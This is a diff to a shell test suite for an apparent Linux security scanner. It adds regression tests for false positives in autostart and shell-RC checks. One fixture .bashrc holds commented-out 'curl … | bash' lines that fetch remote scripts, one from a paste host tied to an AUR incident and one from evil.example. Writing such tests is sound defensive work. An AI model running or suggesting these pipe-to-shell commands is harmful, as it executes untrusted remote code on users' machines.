@@ -615,6 +615,56 @@ SVC
     fi
     rm -rf "$tmpdir7"
     rm -f "$allow_file3" "$allow_file4"
+
+    # Sub-test N: absolute .desktop Exec= path under $HOME/bin or
+    # $HOME/.local/bin must NOT be flagged — regression guard for a real
+    # false positive (Conky's LXQt-generated autostart entry pointing at a
+    # personal launcher script in ~/bin).
+    local tmpdir8
+    tmpdir8=$(mktemp -d)
+    mkdir -p "$tmpdir8/.config/autostart" "$tmpdir8/bin" "$tmpdir8/.local/bin"
+    cat > "$tmpdir8/.config/autostart/conky.desktop" << DESK
+[Desktop Entry]
+Type=Application
+Name=Conky
+Exec=$tmpdir8/bin/conky-start.sh
+DESK
+    cat > "$tmpdir8/.config/autostart/localbin.desktop" << DESK
+[Desktop Entry]
+Type=Application
+Name=LocalBinThing
+Exec=$tmpdir8/.local/bin/something.sh
+DESK
+    rc=0
+    out=$(AUTOSTART_HOME="$tmpdir8" \
+        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
+    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
+        pass "check_autostart: absolute Exec= under \$HOME/bin or \$HOME/.local/bin not flagged"
+    else
+        fail "check_autostart: \$HOME/bin false positive regression, rc=$rc, out: $out"
+    fi
+    rm -rf "$tmpdir8"
+
+    # Sub-test O: a fully commented-out line matching a dangerous shell-RC
+    # pattern must NOT be flagged — regression guard for a real false
+    # positive (a user kept an old, disabled alias as a commented-out note
+    # referencing the original AUR incident).
+    local tmpdir9
+    tmpdir9=$(mktemp -d)
+    cat > "$tmpdir9/.bashrc" << 'RC'
+echo hello
+# alias ckaur='curl -s https://cscs.pastes.sh/raw/aurvulntest20260611.sh | bash'  #<----[ check for the new aur vulnerability (06-2026)
+    # indented comment: curl -s https://evil.example | bash
+RC
+    rc=0
+    out=$(AUTOSTART_HOME="$tmpdir9" \
+        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
+    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
+        pass "check_autostart: commented-out shell RC pattern not flagged"
+    else
+        fail "check_autostart: commented-out RC line false positive regression, rc=$rc, out: $out"
+    fi
+    rm -rf "$tmpdir9"
 }
 
 # ---------------------------------------------------------------------------
